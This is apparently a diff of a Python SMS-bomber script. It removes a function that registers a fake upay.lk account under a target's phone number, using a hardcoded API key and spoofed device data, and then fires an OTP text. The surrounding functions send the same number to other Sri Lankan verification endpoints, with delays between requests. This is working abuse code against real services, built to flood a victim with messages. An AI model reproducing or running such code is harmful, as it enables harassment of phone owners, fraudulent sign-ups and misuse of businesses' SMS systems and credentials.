@@ -149,23 +149,6 @@ def domin(num,delay):
     data={'lastName':'','mobile':num[1:],'firstName':''}
     po=post(url,headers=headers,json=data)
     time.sleep(delay)
-def upay(num,delay):
-    def getid(num):
-        url='https://apigateway.upay.lk/platform-service/customer/signup/heyu'
-        headers={'Host':'apigateway.upay.lk','x-api-key':'IdHobBMY1q70qCMnWECcV1FZw6AVGnyH5pSTaHKa'}
-        json={'name':'Santha','mobile':num,'username':'+94'+num,'countryCode':'+94','password':'1234','deviceInfo':{'deviceType':'MOBILE','deviceUUID':'68e6a23f3b598e32','deviceSerial':'nkonuwn','deviceModel':'Nokia 2.2','os':'Android','deviceManufacturer':'HMD Global','osVersion':'10','isVirtual':False},'termsAndConditionsVersionId':'2.0','privacyPolicyVersionId':'2.0','signUpReferrer':None}
-        idreq=post(url,headers=headers,json=json)
-        return idreq
-    idreq=getid(num)
-    def sms(idreq):
-        url='https://apigateway.upay.lk/platform-service/otp/request'
-        header={'Host':'apigateway.upay.lk','x-api-key':'IdHobBMY1q70qCMnWECcV1FZw6AVGnyH5pSTaHKa'}
-        json={'otpType':'SIGNUP','notificationMedium':'MOBILE','userId':idreq.json()['data']['userId']}
-        po=post(url,headers=header,json=json)
-        idreq=getid(num)
-        #sms(idreq)
-    sms(idreq)
-    time.sleep(delay)
 def oli(num,delay):
     url='https://compete.slmathsolympiad.org/api/parent/verifyPhone'
     head={'Host':'compete.slmathsolympiad.org','User-Agent': 'Mozilla/5.0 (Linux; Android 10; Nokia 2.2 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Content-Type':'application/json'}
